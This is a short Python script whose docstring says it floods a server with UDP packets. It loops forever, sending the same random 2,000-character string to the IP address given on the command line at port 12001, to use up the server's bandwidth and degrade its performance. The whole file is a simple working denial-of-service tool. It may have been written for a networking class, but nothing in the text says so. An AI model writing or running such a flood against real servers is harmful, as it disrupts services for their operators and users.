"""
This program initializes a UDP Client which attempts repeatedly send the same random 2000 letter string
to the Server whose IP address is the first command line argument to the program and whose port number is 12001.
This is done in an attempt to use up as much of the server's bandwidth as possible and degrade the performance of the server. 
"""
from socket import * 
import sys
import time
import random, string
s = socket(AF_INET,SOCK_DGRAM) #initialize UDP socket
st ="".join(random.choice(string.ascii_uppercase + string.digits) for _ in range(2000)) #initialize random string
while True: #loop forever
	s.sendto(st.encode(),(sys.argv[1],12001)) #send string to 1st arg:12001
